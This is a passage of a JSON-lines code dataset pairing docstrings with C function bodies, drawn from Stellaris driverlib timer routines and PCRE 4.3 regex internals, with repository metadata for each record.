}\n    }\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Gets the timer match value.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer; must be one of \\b TIMER_A or\n//! \\b TIMER_B.  Only \\b TIMER_A should be used when the timer is configured\n//! for full-width operation.\n//!\n//! This function gets the match value for the specified timer.\n//!\n//! \\note This function can be used for both full- and half-width modes of\n//! 16/32-bit timers and for half-width modes of 32/64-bit timers.  Use\n//! TimerMatchGet64() for full-width modes of 32/64-bit timers.\n//!\n//! \\return Returns the match value for the timer.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nTimerMatchGet(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B));\n\n    //\n    // Return the appropriate match value.\n    //\n    return((ulTimer == TIMER_A) ? HWREG(ulBase + TIMER_O_TAMATCHR) :\n           HWREG(ulBase + TIMER_O_TBMATCHR));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//! - \\b TIMER_CFG_A_PERIODIC - Half-width periodic timer\n//! - \\b TIMER_CFG_A_PERIODIC_UP - Half-width periodic timer that counts up\n//!   instead of down (not available on all parts)\n//! - \\b TIMER_CFG_A_CAP_COUNT - Half-width edge count capture\n//! - \\b TIMER_CFG_A_CAP_COUNT_UP - Half-width edge count capture that counts\n//!   up instead of down (not available on all parts)\n//! - \\b TIMER_CFG_A_CAP_TIME - Half-width edge time capture\n//! - \\b TIMER_CFG_A_CAP_TIME_UP - Half-width edge time capture that counts up\n//!   instead of down (not available on all parts)\n//! - \\b TIMER_CFG_A_PWM - Half-width PWM output\n//!\n//! Similarly, the second timer is configured by setting \\e ulConfig to\n//! the result of a logical OR operation between one of the corresponding\n//! \\b TIMER_CFG_B_* values and \\e ulConfig.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerConfigure(unsigned long ulBase, unsigned long ulConfig)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulConfig == TIMER_CFG_ONE_SHOT) ||\n           (ulConfig == TIMER_CFG_ONE_SHOT_UP) ||\n           (ulConfig == TIMER_CFG_PERIODIC) ||\n           (ulConfig == TIMER_CFG_PERIODIC_UP) ||\n           (ulConfig == TIMER_CFG_RTC) ||\n           ((ulConfig & 0xff000000) == TIMER_CFG_SPLIT_PAIR));\n    ASSERT(((ulConfig & 0xff000000) != TIMER_CFG_SPLIT_PAIR) ||\n           ((((ulConfig & 0x000000ff) == TIMER_CFG_A_ONE_SHOT) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_ONE_SHOT_UP) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_PERIODIC) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_PERIODIC_UP) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_CAP_COUNT) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_CAP_TIME) ||\n             ((ulConfig & 0x000000ff) == TIMER_CFG_A_PWM)) &&\n            (((ulConfig & 0x0000ff00) == TIMER_CFG_B_ONE_SHOT) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_ONE_SHOT_UP) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_PERIODIC) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_PERIODIC_UP) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_CAP_COUNT) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_CAP_COUNT_UP) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_CAP_TIME) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_CAP_TIME_UP) ||\n             ((ulConfig & 0x0000ff00) == TIMER_CFG_B_PWM))));\n\n    //\n    // Disable the timers.\n    //\n    HWREG(ulBase + TIMER_O_CTL) &= ~(TIMER_CTL_TAEN | TIMER_CTL_TBEN);\n\n    //\n    // Set the global timer configuration.\n    //\n    HWREG(ulBase + TIMER_O_CFG) = ulConfig >> 24;\n\n    //\n    // Set the configuration of the A and B timers.  Note that the B timer\n    // configuration is ignored by the hardware in 32-bit modes.\n    //\n    HWREG(ulBase + TIMER_O_TAMR) = (ulConfig & 255) | TIMER_TAMR_TAPWMIE;\n    HWREG(ulBase + TIMER_O_TBMR) =\n        ((ulConfig >> 8) & 255) | TIMER_TBMR_TBPWMIE;\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//*****************************************************************************\n//\n//! Unregisters an interrupt handler for the timer interrupt.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer(s); must be one of \\b TIMER_A,\n//! \\b TIMER_B, or \\b TIMER_BOTH.\n//!\n//! This function unregisters the handler to be called when a timer interrupt\n//! occurs.  This function also masks off the interrupt in the interrupt\n//! controller so that the interrupt handler is no longer called.\n//!\n//! \\sa IntRegister() for important information about registering interrupt\n//! handlers.\n//!\n//! \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nTimerIntUnregister(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Get the interrupt number for this timer module.\n    //\n    ulBase = TimerIntNumberGet(ulBase);\n\n    //\n    // Unregister the interrupt handler for timer A if requested.\n    //\n    if(ulTimer & TIMER_A)\n    {\n        //\n        // Disable the interrupt.\n        //\n        IntDisable(ulBase);\n\n        //\n        // Unregister the interrupt handler.\n        //\n        IntUnregister(ulBase);\n    }\n\n    //\n    // Unregister the interrupt handler for timer B if requested.\n    //\n    if(ulTimer & TIMER_B)\n    {\n        //\n        // Disable the interrupt.\n        //\n        IntDisable(ulBase + 1);\n\n        //\n        // Unregister the interrupt handler.\n        //\n        IntUnregister(ulBase + 1);\n    }\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "//\n//! Get the timer prescale value.\n//!\n//! \\param ulBase is the base address of the timer module.\n//! \\param ulTimer specifies the timer; must be one of \\b TIMER_A or\n//! \\b TIMER_B.\n//!\n//! This function gets the value of the input clock prescaler.  The prescaler\n//! is only operational when in half-width mode and is used to extend the range\n//! of the half-width timer modes. The prescaler provides the least significant\n//! bits when counting down in periodic and one-shot modes; in all other modes,\n//! the prescaler provides the most significant bits.\n//!\n//! \\note The availability of the prescaler varies with the Stellaris part and\n//! timer mode in use.  Please consult the datasheet for the part you are using\n//! to determine whether this support is available.\n//!\n//! \\return The value of the timer prescaler.\n//\n//*****************************************************************************\n", "func_signal": "unsigned long\nTimerPrescaleGet(unsigned long ulBase, unsigned long ulTimer)", "code": "{\n    //\n    // Check the arguments.\n    //\n    ASSERT(TimerBaseValid(ulBase));\n    ASSERT((ulTimer == TIMER_A) || (ulTimer == TIMER_B) ||\n           (ulTimer == TIMER_BOTH));\n\n    //\n    // Return the appropriate prescale value.\n    //\n    return((ulTimer == TIMER_A) ? HWREG(ulBase + TIMER_O_TAPR) :\n           HWREG(ulBase + TIMER_O_TBPR));\n}", "path": "driverlib\\timer.c", "repo_name": "yuvadm/stellaris", "stars": 51, "license": "None", "language": "c", "size": 6119}
{"docstring": "/* This function is used by the two extraction functions below, as well\nas being generally available.\n\nArguments:\n  code        the compiled regex\n  stringname  the name whose number is required\n\nReturns:      the number of the named parentheses, or a negative number\n                (PCRE_ERROR_NOSUBSTRING) if not found\n*/\n", "func_signal": "int\npcre_get_stringnumber(const pcre *code, const char *stringname)", "code": "{\nint rc;\nint entrysize;\nint top, bot;\nuschar *nametable;\n\nif ((rc = pcre_fullinfo(code, NULL, PCRE_INFO_NAMECOUNT, &top)) != 0)\n  return rc;\nif (top <= 0) return PCRE_ERROR_NOSUBSTRING;\n\nif ((rc = pcre_fullinfo(code, NULL, PCRE_INFO_NAMEENTRYSIZE, &entrysize)) != 0)\n  return rc;\nif ((rc = pcre_fullinfo(code, NULL, PCRE_INFO_NAMETABLE, &nametable)) != 0)\n  return rc;\n\nbot = 0;\nwhile (top > bot)\n  {\n  int mid = (top + bot) / 2;\n  uschar *entry = nametable + entrysize*mid;\n  int c = strcmp(stringname, (char *)(entry + 2));\n  if (c == 0) return (entry[0] << 8) + entry[1];\n  if (c > 0) bot = mid + 1; else top = mid;\n  }\n\nreturn PCRE_ERROR_NOSUBSTRING;\n}", "path": "src\\pcre-4.3\\get.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This is a newer \"info\" function which has an extensible interface so\nthat additional items can be added compatibly.\n\nArguments:\n  external_re      points to compiled code\n  extra_data       points extra data, or NULL\n  what             what information is required\n  where            where to put the information\n\nReturns:           0 if data returned, negative on error\n*/\n", "func_signal": "int\npcre_fullinfo(const pcre *external_re, const pcre_extra *extra_data, int what,\n  void *where)", "code": "{\nconst real_pcre *re = (const real_pcre *)external_re;\nconst pcre_study_data *study = NULL;\n\nif (re == NULL || where == NULL) return PCRE_ERROR_NULL;\nif (re->magic_number != MAGIC_NUMBER) return PCRE_ERROR_BADMAGIC;\n\nif (extra_data != NULL && (extra_data->flags & PCRE_EXTRA_STUDY_DATA) != 0)\n  study = extra_data->study_data;\n\nswitch (what)\n  {\n  case PCRE_INFO_OPTIONS:\n  *((unsigned long int *)where) = re->options & PUBLIC_OPTIONS;\n  break;\n\n  case PCRE_INFO_SIZE:\n  *((size_t *)where) = re->size;\n  break;\n\n  case PCRE_INFO_STUDYSIZE:\n  *((size_t *)where) = (study == NULL)? 0 : study->size;\n  break;\n\n  case PCRE_INFO_CAPTURECOUNT:\n  *((int *)where) = re->top_bracket;\n  break;\n\n  case PCRE_INFO_BACKREFMAX:\n  *((int *)where) = re->top_backref;\n  break;\n\n  case PCRE_INFO_FIRSTBYTE:\n  *((int *)where) =\n    ((re->options & PCRE_FIRSTSET) != 0)? re->first_byte :\n    ((re->options & PCRE_STARTLINE) != 0)? -1 : -2;\n  break;\n\n  case PCRE_INFO_FIRSTTABLE:\n  *((const uschar **)where) =\n    (study != NULL && (study->options & PCRE_STUDY_MAPPED) != 0)?\n      study->start_bits : NULL;\n  break;\n\n  case PCRE_INFO_LASTLITERAL:\n  *((int *)where) =\n    ((re->options & PCRE_REQCHSET) != 0)? re->req_byte : -1;\n  break;\n\n  case PCRE_INFO_NAMEENTRYSIZE:\n  *((int *)where) = re->name_entry_size;\n  break;\n\n  case PCRE_INFO_NAMECOUNT:\n  *((int *)where) = re->name_count;\n  break;\n\n  case PCRE_INFO_NAMETABLE:\n  *((const uschar **)where) = (const uschar *)re + sizeof(real_pcre);\n  break;\n\n  default: return PCRE_ERROR_BADOPTION;\n  }\n\nreturn 0;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function is called to check the name given in a POSIX-style class entry\nsuch as [:alnum:].\n\nArguments:\n  ptr        points to the first letter\n  len        the length of the name\n\nReturns:     a value representing the name, or -1 if unknown\n*/\n", "func_signal": "static int\ncheck_posix_name(const uschar *ptr, int len)", "code": "{\nregister int yield = 0;\nwhile (posix_name_lengths[yield] != 0)\n  {\n  if (len == posix_name_lengths[yield] &&\n    strncmp((const char *)ptr, posix_names[yield], len) == 0) return yield;\n  yield++;\n  }\nreturn -1;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function scans through a branch of a compiled pattern to see whether it\ncan match the empty string or not. It is called only from could_be_empty()\nbelow. Note that first_significant_code() skips over assertions. If we hit an\nunclosed bracket, we return \"empty\" - this means we've struck an inner bracket\nwhose current branch will already have been scanned.\n\nArguments:\n  code        points to start of search\n  endcode     points to where to stop\n  utf8        TRUE if in UTF8 mode\n\nReturns:      TRUE if what is matched could be empty\n*/\n", "func_signal": "static BOOL\ncould_be_empty_branch(const uschar *code, const uschar *endcode, BOOL utf8)", "code": "{\nregister int c;\nfor (code = first_significant_code(code + 1 + LINK_SIZE, NULL, 0);\n     code < endcode;\n     code = first_significant_code(code + OP_lengths[c], NULL, 0))\n  {\n  const uschar *ccode;\n\n  c = *code;\n\n  if (c >= OP_BRA)\n    {\n    BOOL empty_branch;\n    if (GET(code, 1) == 0) return TRUE;    /* Hit unclosed bracket */\n\n    /* Scan a closed bracket */\n\n    empty_branch = FALSE;\n    do\n      {\n      if (!empty_branch && could_be_empty_branch(code, endcode, utf8))\n        empty_branch = TRUE;\n      code += GET(code, 1);\n      }\n    while (*code == OP_ALT);\n    if (!empty_branch) return FALSE;   /* All branches are non-empty */\n    code += 1 + LINK_SIZE;\n    c = *code;\n    }\n\n  else switch (c)\n    {\n    /* Check for quantifiers after a class */\n\n#ifdef SUPPORT_UTF8\n    case OP_XCLASS:\n    ccode = code + GET(code, 1);\n    goto CHECK_CLASS_REPEAT;\n#endif\n\n    case OP_CLASS:\n    case OP_NCLASS:\n    ccode = code + 33;\n\n#ifdef SUPPORT_UTF8\n    CHECK_CLASS_REPEAT:\n#endif\n\n    switch (*ccode)\n      {\n      case OP_CRSTAR:            /* These could be empty; continue */\n      case OP_CRMINSTAR:\n      case OP_CRQUERY:\n      case OP_CRMINQUERY:\n      break;\n\n      default:                   /* Non-repeat => class must match */\n      case OP_CRPLUS:            /* These repeats aren't empty */\n      case OP_CRMINPLUS:\n      return FALSE;\n\n      case OP_CRRANGE:\n      case OP_CRMINRANGE:\n      if (GET2(ccode, 1) > 0) return FALSE;  /* Minimum > 0 */\n      break;\n      }\n    break;\n\n    /* Opcodes that must match a character */\n\n    case OP_NOT_DIGIT:\n    case OP_DIGIT:\n    case OP_NOT_WHITESPACE:\n    case OP_WHITESPACE:\n    case OP_NOT_WORDCHAR:\n    case OP_WORDCHAR:\n    case OP_ANY:\n    case OP_ANYBYTE:\n    case OP_CHARS:\n    case OP_NOT:\n    case OP_PLUS:\n    case OP_MINPLUS:\n    case OP_EXACT:\n    case OP_NOTPLUS:\n    case OP_NOTMINPLUS:\n    case OP_NOTEXACT:\n    case OP_TYPEPLUS:\n    case OP_TYPEMINPLUS:\n    case OP_TYPEEXACT:\n    return FALSE;\n\n    /* End of branch */\n\n    case OP_KET:\n    case OP_KETRMAX:\n    case OP_KETRMIN:\n    case OP_ALT:\n    return TRUE;\n\n    /* In UTF-8 mode, STAR, MINSTAR, QUERY, MINQUERY, UPTO, and MINUPTO  may be\n    followed by a multibyte character */\n\n#ifdef SUPPORT_UTF8\n    case OP_STAR:\n    case OP_MINSTAR:\n    case OP_QUERY:\n    case OP_MINQUERY:\n    case OP_UPTO:\n    case OP_MINUPTO:\n    if (utf8) while ((code[2] & 0xc0) == 0x80) code++;\n    break;\n#endif\n    }\n  }\n\nreturn TRUE;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function copies a single captured substring into a piece of new\nstore\n\nArguments:\n  subject        the subject string that was matched\n  ovector        pointer to the offsets table\n  stringcount    the number of substrings that were captured\n                   (i.e. the yield of the pcre_exec call, unless\n                   that was zero, in which case it should be 1/3\n                   of the offset table size)\n  stringnumber   the number of the required substring\n  stringptr      where to put a pointer to the substring\n\nReturns:         if successful:\n                   the length of the string, not including the zero that\n                   is put on the end; can be zero\n                 if not successful:\n                   PCRE_ERROR_NOMEMORY (-6) failed to get store\n                   PCRE_ERROR_NOSUBSTRING (-7) substring not present\n*/\n", "func_signal": "int\npcre_get_substring(const char *subject, int *ovector, int stringcount,\n  int stringnumber, const char **stringptr)", "code": "{\nint yield;\nchar *substring;\nif (stringnumber < 0 || stringnumber >= stringcount)\n  return PCRE_ERROR_NOSUBSTRING;\nstringnumber *= 2;\nyield = ovector[stringnumber+1] - ovector[stringnumber];\nsubstring = (char *)(pcre_malloc)(yield + 1);\nif (substring == NULL) return PCRE_ERROR_NOMEMORY;\nmemcpy(substring, subject + ovector[stringnumber], yield);\nsubstring[yield] = 0;\n*stringptr = substring;\nreturn yield;\n}", "path": "src\\pcre-4.3\\get.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* During compilation, the \"first char\" settings from forward assertions are\ndiscarded, because they can cause conflicts with actual literals that follow.\nHowever, if we end up without a first char setting for an unanchored pattern,\nit is worth scanning the regex to see if there is an initial asserted first\nchar. If all branches start with the same asserted char, or with a bracket all\nof whose alternatives start with the same asserted char (recurse ad lib), then\nwe return that char, otherwise -1.\n\nArguments:\n  code       points to start of expression (the bracket)\n  options    pointer to the options (used to check casing changes)\n  inassert   TRUE if in an assertion\n\nReturns:     -1 or the fixed first char\n*/\n", "func_signal": "static int\nfind_firstassertedchar(const uschar *code, int *options, BOOL inassert)", "code": "{\nregister int c = -1;\ndo {\n   int d;\n   const uschar *scode =\n     first_significant_code(code + 1+LINK_SIZE, options, PCRE_CASELESS);\n   register int op = *scode;\n\n   if (op >= OP_BRA) op = OP_BRA;\n\n   switch(op)\n     {\n     default:\n     return -1;\n\n     case OP_BRA:\n     case OP_ASSERT:\n     case OP_ONCE:\n     case OP_COND:\n     if ((d = find_firstassertedchar(scode, options, op == OP_ASSERT)) < 0)\n       return -1;\n     if (c < 0) c = d; else if (c != d) return -1;\n     break;\n\n     case OP_EXACT:       /* Fall through */\n     scode++;\n\n     case OP_CHARS:       /* Fall through */\n     scode++;\n\n     case OP_PLUS:\n     case OP_MINPLUS:\n     if (!inassert) return -1;\n     if (c < 0)\n       {\n       c = scode[1];\n       if ((*options & PCRE_CASELESS) != 0) c |= REQ_CASELESS;\n       }\n     else if (c != scode[1]) return -1;\n     break;\n     }\n\n   code += GET(code, 1);\n   }\nwhile (*code == OP_ALT);\nreturn c;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function is called from within the XCLASS code below, to match a\ncharacter against an extended class which might match values > 255.\n\nArguments:\n  c           the character\n  data        points to the flag byte of the XCLASS data\n\nReturns:      TRUE if character matches, else FALSE\n*/\n", "func_signal": "static BOOL\nmatch_xclass(int c, const uschar *data)", "code": "{\nint t;\nBOOL negated = (*data & XCL_NOT) != 0;\n\n/* Character values < 256 are matched against a bitmap, if one is present. If\nnot, we still carry on, because there may be ranges that start below 256 in the\nadditional data. */\n\nif (c < 256)\n  {\n  if ((*data & XCL_MAP) != 0 && (data[1 + c/8] & (1 << (c&7))) != 0)\n    return !negated;   /* char found */\n  }\n\n/* Now match against the list of large chars or ranges that end with a large\nchar. First skip the bit map if present. */\n\nif ((*data++ & XCL_MAP) != 0) data += 32;\n\nwhile ((t = *data++) != XCL_END)\n  {\n  int x, y;\n  GETCHARINC(x, data);\n  if (t == XCL_SINGLE)\n    {\n    if (c == x) return !negated;\n    }\n  else\n    {\n    GETCHARINC(y, data);\n    if (c >= x && c <= y) return !negated;\n    }\n  }\n\nreturn negated;   /* char was not found */\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function is called to check for left recursive calls. We want to check\nthe current branch of the current pattern to see if it could match the empty\nstring. If it could, we must look outwards for branches at other levels,\nstopping when we pass beyond the bracket which is the subject of the recursion.\n\nArguments:\n  code        points to start of the recursion\n  endcode     points to where to stop (current RECURSE item)\n  bcptr       points to the chain of current (unclosed) branch starts\n  utf8        TRUE if in UTF-8 mode\n\nReturns:      TRUE if what is matched could be empty\n*/\n", "func_signal": "static BOOL\ncould_be_empty(const uschar *code, const uschar *endcode, branch_chain *bcptr,\n  BOOL utf8)", "code": "{\nwhile (bcptr != NULL && bcptr->current >= code)\n  {\n  if (!could_be_empty_branch(bcptr->current, endcode, utf8)) return FALSE;\n  bcptr = bcptr->outer;\n  }\nreturn TRUE;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This is function which has an extensible interface so that additional items\ncan be added compatibly.\n\nArguments:\n  what             what information is required\n  where            where to put the information\n\nReturns:           0 if data returned, negative on error\n*/\n", "func_signal": "int\npcre_config(int what, void *where)", "code": "{\nswitch (what)\n  {\n  case PCRE_CONFIG_UTF8:\n  #ifdef SUPPORT_UTF8\n  *((int *)where) = 1;\n  #else\n  *((int *)where) = 0;\n  #endif\n  break;\n\n  case PCRE_CONFIG_NEWLINE:\n  *((int *)where) = NEWLINE;\n  break;\n\n  case PCRE_CONFIG_LINK_SIZE:\n  *((int *)where) = LINK_SIZE;\n  break;\n\n  //case PCRE_CONFIG_POSIX_MALLOC_THRESHOLD:\n // *((int *)where) = POSIX_MALLOC_THRESHOLD;\n  //break;\n\n  case PCRE_CONFIG_MATCH_LIMIT:\n  *((unsigned int *)where) = MATCH_LIMIT;\n  break;\n\n  default: return PCRE_ERROR_BADOPTION;\n  }\n\nreturn 0;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This is called by several functions that scan a compiled expression looking\nfor a fixed first character, or an anchoring op code etc. It skips over things\nthat do not influence this. For some calls, a change of option is important.\n\nArguments:\n  code       pointer to the start of the group\n  options    pointer to external options\n  optbit     the option bit whose changing is significant, or\n               zero if none are\n\nReturns:     pointer to the first significant opcode\n*/\n", "func_signal": "static const uschar*\nfirst_significant_code(const uschar *code, int *options, int optbit)", "code": "{\nfor (;;)\n  {\n  switch ((int)*code)\n    {\n    case OP_OPT:\n    if (optbit > 0 && ((int)code[1] & optbit) != (*options & optbit))\n      *options = (int)code[1];\n    code += 2;\n    break;\n\n    case OP_ASSERT_NOT:\n    case OP_ASSERTBACK:\n    case OP_ASSERTBACK_NOT:\n    do code += GET(code, 1); while (*code == OP_ALT);\n    /* Fall through */\n\n    case OP_CALLOUT:\n    case OP_CREF:\n    case OP_BRANUMBER:\n    case OP_WORD_BOUNDARY:\n    case OP_NOT_WORD_BOUNDARY:\n    code += OP_lengths[*code];\n    break;\n\n    default:\n    return code;\n    }\n  }\n/* Control never reaches here */\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This is the original \"info\" function. It picks potentially useful data out\nof the private structure, but its interface was too rigid. It remains for\nbackwards compatibility. The public options are passed back in an int - though\nthe re->options field has been expanded to a long int, all the public options\nat the low end of it, and so even on 16-bit systems this will still be OK.\nTherefore, I haven't changed the API for pcre_info().\n\nArguments:\n  external_re   points to compiled code\n  optptr        where to pass back the options\n  first_byte    where to pass back the first character,\n                or -1 if multiline and all branches start ^,\n                or -2 otherwise\n\nReturns:        number of capturing subpatterns\n                or negative values on error\n*/\n", "func_signal": "int\npcre_info(const pcre *external_re, int *optptr, int *first_byte)", "code": "{\nconst real_pcre *re = (const real_pcre *)external_re;\nif (re == NULL) return PCRE_ERROR_NULL;\nif (re->magic_number != MAGIC_NUMBER) return PCRE_ERROR_BADMAGIC;\nif (optptr != NULL) *optptr = (int)(re->options & PUBLIC_OPTIONS);\nif (first_byte != NULL)\n  *first_byte = ((re->options & PCRE_FIRSTSET) != 0)? re->first_byte :\n     ((re->options & PCRE_STARTLINE) != 0)? -1 : -2;\nreturn re->top_bracket;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* This function is called when the sequence \"[:\" or \"[.\" or \"[=\" is\nencountered in a character class. It checks whether this is followed by an\noptional ^ and then a sequence of letters, terminated by a matching \":]\" or\n\".]\" or \"=]\".\n\nArgument:\n  ptr      pointer to the initial [\n  endptr   where to return the end pointer\n  cd       pointer to compile data\n\nReturns:   TRUE or FALSE\n*/\n", "func_signal": "static BOOL\ncheck_posix_syntax(const uschar *ptr, const uschar **endptr, compile_data *cd)", "code": "{\nint terminator;          /* Don't combine these lines; the Solaris cc */\nterminator = *(++ptr);   /* compiler warns about \"non-constant\" initializer. */\nif (*(++ptr) == '^') ptr++;\nwhile ((cd->ctypes[*ptr] & ctype_letter) != 0) ptr++;\nif (*ptr == terminator && ptr[1] == ']')\n  {\n  *endptr = ptr;\n  return TRUE;\n  }\nreturn FALSE;\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
{"docstring": "/* Scan a pattern and compute the fixed length of subject that will match it,\nif the length is fixed. This is needed for dealing with backward assertions.\nIn UTF8 mode, the result is in characters rather than bytes.\n\nArguments:\n  code     points to the start of the pattern (the bracket)\n  options  the compiling options\n\nReturns:   the fixed length, or -1 if there is no fixed length,\n             or -2 if \\C was encountered\n*/\n", "func_signal": "static int\nfind_fixedlength(uschar *code, int options)", "code": "{\nint length = -1;\n\nregister int branchlength = 0;\nregister uschar *cc = code + 1 + LINK_SIZE;\n\n/* Scan along the opcodes for this branch. If we get to the end of the\nbranch, check the length against that of the other branches. */\n\nfor (;;)\n  {\n  int d;\n  register int op = *cc;\n  if (op >= OP_BRA) op = OP_BRA;\n\n  switch (op)\n    {\n    case OP_BRA:\n    case OP_ONCE:\n    case OP_COND:\n    d = find_fixedlength(cc, options);\n    if (d < 0) return d;\n    branchlength += d;\n    do cc += GET(cc, 1); while (*cc == OP_ALT);\n    cc += 1 + LINK_SIZE;\n    break;\n\n    /* Reached end of a branch; if it's a ket it is the end of a nested\n    call. If it's ALT it is an alternation in a nested call. If it is\n    END it's the end of the outer call. All can be handled by the same code. */\n\n    case OP_ALT:\n    case OP_KET:\n    case OP_KETRMAX:\n    case OP_KETRMIN:\n    case OP_END:\n    if (length < 0) length = branchlength;\n      else if (length != branchlength) return -1;\n    if (*cc != OP_ALT) return length;\n    cc += 1 + LINK_SIZE;\n    branchlength = 0;\n    break;\n\n    /* Skip over assertive subpatterns */\n\n    case OP_ASSERT:\n    case OP_ASSERT_NOT:\n    case OP_ASSERTBACK:\n    case OP_ASSERTBACK_NOT:\n    do cc += GET(cc, 1); while (*cc == OP_ALT);\n    /* Fall through */\n\n    /* Skip over things that don't match chars */\n\n    case OP_REVERSE:\n    case OP_BRANUMBER:\n    case OP_CREF:\n    case OP_OPT:\n    case OP_CALLOUT:\n    case OP_SOD:\n    case OP_SOM:\n    case OP_EOD:\n    case OP_EODN:\n    case OP_CIRC:\n    case OP_DOLL:\n    case OP_NOT_WORD_BOUNDARY:\n    case OP_WORD_BOUNDARY:\n    cc += OP_lengths[*cc];\n    break;\n\n    /* Handle char strings. In UTF-8 mode we must count characters, not bytes.\n    This requires a scan of the string, unfortunately. We assume valid UTF-8\n    strings, so all we do is reduce the length by one for every byte whose bits\n    are 10xxxxxx. */\n\n    case OP_CHARS:\n    branchlength += *(++cc);\n#ifdef SUPPORT_UTF8\n    if ((options & PCRE_UTF8) != 0)\n      for (d = 1; d <= *cc; d++)\n        if ((cc[d] & 0xc0) == 0x80) branchlength--;\n#endif\n    cc += *cc + 1;\n    break;\n\n    /* Handle exact repetitions. The count is already in characters, but we\n    need to skip over a multibyte character in UTF8 mode.  */\n\n    case OP_EXACT:\n    branchlength += GET2(cc,1);\n    cc += 4;\n#ifdef SUPPORT_UTF8\n    if ((options & PCRE_UTF8) != 0)\n      {\n      while((*cc & 0x80) == 0x80) cc++;\n      }\n#endif\n    break;\n\n    case OP_TYPEEXACT:\n    branchlength += GET2(cc,1);\n    cc += 4;\n    break;\n\n    /* Handle single-char matchers */\n\n    case OP_NOT_DIGIT:\n    case OP_DIGIT:\n    case OP_NOT_WHITESPACE:\n    case OP_WHITESPACE:\n    case OP_NOT_WORDCHAR:\n    case OP_WORDCHAR:\n    case OP_ANY:\n    branchlength++;\n    cc++;\n    break;\n\n    /* The single-byte matcher isn't allowed */\n\n    case OP_ANYBYTE:\n    return -2;\n\n    /* Check a class for variable quantification */\n\n#ifdef SUPPORT_UTF8\n    case OP_XCLASS:\n    cc += GET(cc, 1) - 33;\n    /* Fall through */\n#endif\n\n    case OP_CLASS:\n    case OP_NCLASS:\n    cc += 33;\n\n    switch (*cc)\n      {\n      case OP_CRSTAR:\n      case OP_CRMINSTAR:\n      case OP_CRQUERY:\n      case OP_CRMINQUERY:\n      return -1;\n\n      case OP_CRRANGE:\n      case OP_CRMINRANGE:\n      if (GET2(cc,1) != GET2(cc,3)) return -1;\n      branchlength += GET2(cc,1);\n      cc += 5;\n      break;\n\n      default:\n      branchlength++;\n      }\n    break;\n\n    /* Anything else is variable length */\n\n    default:\n    return -1;\n    }\n  }\n/* Control never gets here */\n}", "path": "src\\pcre-4.3\\pcre.c", "repo_name": "timperrett/Mac-SoapClient", "stars": 34, "license": "None", "language": "c", "size": 7602}
